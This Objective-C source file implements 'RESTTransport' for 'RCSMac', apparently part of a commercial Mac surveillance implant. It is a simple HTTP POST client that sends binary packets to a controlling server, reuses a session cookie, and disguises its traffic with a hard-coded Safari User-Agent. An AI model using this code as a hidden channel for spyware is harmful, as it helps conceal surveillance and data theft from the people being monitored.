/*
 * RCSMac - RESTTransport
 *  Transport implementation for REST Protocol.
 *
 *
 * Created on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "RESTTransport.h"
#import "RCSICommon.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"

//#define DEBUG_TRANSPORT
#define infoLog NSLog
#define errorLog NSLog
#define warnLog NSLog

#define USER_AGENT @"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"


@implementation RESTTransport

- (id)initWithURL: (NSURL *)aURL
           onPort: (int32_t)aPort
{
  if (self = [super init])
    {
      if (aURL == nil)
        {
#ifdef DEBUG_TRANSPORT
          errorLog(@"URL is null");
#endif
          
          return nil;
        }
     
#ifdef DEBUG_TRANSPORT
      infoLog(@"host: %@", aURL);
      infoLog(@"port: %d", aPort);
#endif
    
      if (aPort <= 0)
        {
#ifdef DEBUG_TRANSPORT
          errorLog(@"Port is invalid");
#endif
          
          [self release];
          return nil;
        }
    
      mURL    = [aURL copy];
      mCookie = nil;
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [mCookie release];
  
  [super dealloc];
}

// Abstract Class Methods
- (BOOL)connect;
{
#ifdef DEBUG_TRANSPORT
  infoLog(@"URL: %@", mURL);
#endif
  
  return YES;
}

- (BOOL)disconnect
{
  return YES;
}
// End Of Abstract Class Methods

- (NSData *)sendData: (NSData *)aPacketData
   returningResponse: (NSURLResponse *)aResponse
{
#ifdef DEBUG_TRANSPORT
  infoLog(@"aPacketData: %@", aPacketData);
  infoLog(@"mURL: %@", mURL);
#endif
  
  NSMutableURLRequest *urlRequest = [[NSMutableURLRequest alloc] initWithURL: mURL];
  NSData *replyData;
  
  [urlRequest setTimeoutInterval: 10];
  [urlRequest setHTTPMethod: @"POST"];
  [urlRequest setHTTPBody: aPacketData];
  [urlRequest setValue: @"application/octet-stream"
    forHTTPHeaderField: @"Content-Type"];
  [urlRequest setValue: USER_AGENT
    forHTTPHeaderField: @"User-Agent"];
  
  //
  // Avoid to store cookies in the cookie manager
  //
  [urlRequest setHTTPShouldHandleCookies: NO];
  
  if (mCookie != nil)
    {
#ifdef DEBUG_TRANSPORT
      infoLog(@"cookie available: %@", mCookie);
#endif
      [urlRequest setValue: mCookie
        forHTTPHeaderField: @"Cookie"];
    }
  
  replyData = [NSURLConnection sendSynchronousRequest: urlRequest
                                    returningResponse: &aResponse
                                                error: nil];
  [urlRequest release];
  
  if (aResponse == nil)
    {
#ifdef DEBUG_TRANSPORT
      errorLog(@"Error while connecting");
#endif
      
      return nil;
    }
  
  NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)aResponse;
  NSDictionary *headerFields = [httpResponse allHeaderFields];
  
  // Handle cookie
  NSString *cookie = [headerFields valueForKey: @"Set-Cookie"];
  
  if (cookie != nil)
    {
#ifdef DEBUG_TRANSPORT
      infoLog(@"Got a cookie, yuppie");
      infoLog(@"Cookie: %@", cookie);
#endif
      
      if (mCookie != nil)
        {
          [mCookie release];
        }
    
      mCookie = [cookie copy];
    }
  
  int statusCode = [httpResponse statusCode];

#ifdef DEBUG_TRANSPORT
  infoLog(@"reply statusCode: %d", statusCode);
#endif
  
  if (statusCode == 200)
    return replyData;
  else
    return nil;
}

@end